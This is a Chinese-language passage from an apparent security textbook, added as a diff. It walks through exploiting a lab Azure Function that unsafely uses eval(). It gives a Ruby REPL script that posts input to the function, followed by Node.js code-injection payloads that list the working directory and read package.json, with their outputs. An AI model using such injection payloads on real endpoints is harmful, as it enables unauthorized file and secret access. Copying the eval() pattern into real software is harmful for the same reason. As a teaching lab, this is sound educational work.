@@ -1,0 +1,162 @@
+
+
+你已完成在 Azure 中设置一个易受攻击的无服务器函数的配置。该函数预期接受有效的数学表达式作为输入，并通过使用 `eval()` 来对其进行求值。在实际应用中，该函数可能可以公开访问，并可从前端界面调用。正如本节开头所述，为保持示例简单并专注于函数本身，本章将跳过前端界面的实现。考虑到这些要点，接下来让我们探索如何借助自定义脚本来利用此无服务器函数。
+
+# Exploiting the Vulnerable Serverless Function
+
+现在，你将模拟攻击者利用你在前一节中部署的易受攻击的无服务器函数。不是手动调用该函数，你将使用一个自定义脚本，该脚本通过自定义 REPL 部分自动化了与函数的交互。使用此脚本，你将首先测试无服务器函数预期的有效数学表达式，然后逐步转向使用代码注入有效负载，以探索部署的代码、读取配置文件，并枚举函数应用中存储的环境变量（[Figure 11-5](#ch11.html#fig1105)）。
+
+![](assets/lsse_1105.png)
+
+在过程中，你将了解 `eval()` 的不安全使用如何使代码注入攻击成为可能，并在无服务器函数环境中执行任意命令。这将帮助你理解使用 `eval()` 的实际后果，以及攻击者如何利用它来枚举环境。
+
+###### Note
+
+本节假设你使用的是 Attacker 账户。为避免第一个和第二个账户之间的会话冲突，在使用第二个账户登录前，请使用不同的浏览器或隐身/私人窗口。
+
+让我们详细回顾步骤：
+
+1. 在新的浏览器窗口中打开 [*https://portal.azure.com*](https://portal.azure.com) 并使用 Attacker 账户登录。
+
+2. 通过单击 Azure 门户顶部导航栏中的 `>_` 图标启动 Azure Cloud Shell。
+
+    ###### Note
+
+    首次启动时，你将经历与 Serverless Lab 账户相同的初始设置过程。系统提示选择 Bash 或 PowerShell 时，选择 Bash 作为 shell 环境。然后，为确保文件在会话之间得以保留，选择“Mount storage account”，选择相应的存储账户订阅，然后从挂载存储账户的选项列表中选择“We will create a storage account for you”。
+
+3. 在 Cloud Shell 终端中（在 `$` 符号之后）运行以下命令以创建名为 `tester.rb` 的新 Ruby 脚本文件：^([7](#ch11.html#id931))
+
+    ```
+    touch tester.rb
+    ```
+
+4. 单击 Editor 以访问 Cloud Shell 的内置代码编辑器。
+
+5. 如果提示切换到 Classic Cloud Shell，选择 Confirm。
+
+6. 找到并单击“Open editor”按钮（`{}`）以打开集成代码编辑器。打开 `tester.rb` 并用以下内容更新其内容：
+
+    ```
+    require 'net/http'
+    require 'uri'
+    
+    INVOKE_URL = ENV['INVOKE_URL']
+    FUNCTION_KEY = ENV['FUNCTION_KEY']
+    
+    unless INVOKE_URL && FUNCTION_KEY
+      puts "Please set INVOKE_URL and FUNCTION_KEY environment variables."
+      exit 1
+    end
+    
+    uri = URI.parse("#{INVOKE_URL}?code=#{FUNCTION_KEY}")
+    
+    loop do
+      print "Enter an expression (or type 'exit' to quit): "
+      input = gets.strip
+      break if input.downcase == 'exit'
+    
+      request = Net::HTTP::Post.new(uri)
+      request['Content-Type'] = 'text/plain'
+      request.body = input
+    
+      response = Net::HTTP.start(uri.hostname,
+                                 uri.port,
+                                 use_ssl: uri.scheme == 'https') do |http|
+        http.request(request)
+      end
+    
+      puts "[OUTPUT RESPONSE] #{response.body}"
+    end
+    ```
+
+    此 Ruby 脚本仅接受用户输入，将其作为 `POST` 请求发送并附带所需的函数密钥，然后打印函数的响应。有了此脚本，你就可以轻松测试各种表达式和有效负载，而无需反复输入 `curl` 命令。
+
+    ###### Note
+
+    本模拟中使用的易受攻击函数已通过函数密钥进行了保护，以便只有你可以在模拟攻击者利用代码注入漏洞和错误配置时调用它。在现实世界的无服务器应用中，Azure Functions 可能并不总是通过函数密钥或其他身份验证机制进行保护，且某些函数甚至在生产环境中也可能公开可访问。
+
+7. 从 Serverless Lab 账户的 Cloud Shell 终端复制 Invoke URL 和函数密钥的值。切换到 Attacker 账户的浏览器窗口和 Cloud Shell 终端，并将这些值存储在环境变量 `INVOKE_URL` 和 `FUNCTION_KEY` 中，以便在后续命令中重复使用：
+
+    ```
+    INVOKE_URL="[SPECIFY INVOKE URL]"
+    FUNCTION_KEY="[SPECIFY FUNCTION KEY]"
+    ```
+
+    ###### Caution
+
+    在 Attacker 账户的 Cloud Shell 终端中运行命令前，请将占位符替换为相应的 Invoke URL 和函数密钥值。
+
+8. 准备就绪后，让我们运行 Ruby 脚本：
+
+    ```
+    export INVOKE_URL=$INVOKE_URL
+    export FUNCTION_KEY=$FUNCTION_KEY
+    
+    ruby tester.rb
+    ```
+
+    这将启动一个 REPL，允许你交互式地输入表达式供无服务器函数求值：
+
+    ```
+    Enter an expression (or type 'exit' to quit):
+    ```
+
+    在幕后，该脚本仅作为 `curl` 的便捷层，自动处理带函数密钥的 `POST` 请求，并返回函数的输出，而无需你重新输入长命令。
+
+9. 在脚本的 REPL 中，在 `Enter an expression (or type 'exit' to quit)` 之后，首先输入函数可以求值的数学表达式：
+
+    ```
+    2 + 5
+    ```
+
+    这会产生以下输出：
+
+    ```
+    [OUTPUT RESPONSE] Evaluation result: 7
+    ```
+
+    列出当前文件夹中的所有文件和目录：
+
+    ```
+    require('fs').readdirSync('./')
+    ```
+
+    这会产生以下输出：
+
+    ```
+    [OUTPUT RESPONSE] Evaluation result: package-lock.json,function-vars.sh,package.json,host.json,node_modules,src
+    ```
+
+    这里，表达式成功列出了函数应用工作目录的内容，因为易受攻击的函数通过 `eval()` 求值了任意 JavaScript 输入。这使你能够访问内置的 Node.js 模块，例如 `fs`，然后使用它执行文件系统操作。
+
+    ###### Note
+
+    真实世界的攻击者会尝试各种表达式和有效负载以查看哪些可以成功执行。在确认任意代码执行是可能之后，攻击者会继续进行文件系统探索、环境变量枚举和其他后利用活动。请记住，在给定环境中成功执行的确切有效负载和表达式取决于实现细节：语言运行时和版本；输入的解析、编码或转义方式；应用的任何清理或验证；以及函数在运行时公开的库、模块、API 或云绑定。
+
+    检查 `package.json` 文件：
+
+    ```
+    require('fs').readFileSync('package.json', 'utf8')
+    ```
+
+    这返回以下内容：
+
+    ```
+    [OUTPUT RESPONSE] Evaluation result: {
+      "name": "",
+      "version": "1.0.0",
+      "description": "",
+      "main": "src/functions/*.js",
+      "scripts": {
+        "start": "func start",
+        "test": "echo \"No tests yet...\""
+      },
+      "dependencies": {
+        "@azure/functions": "^4.0.0"
+      },
+      "devDependencies": {
+        "azure-functions-core-tools": "^4.x"
+      }
+    }
+    ```
+
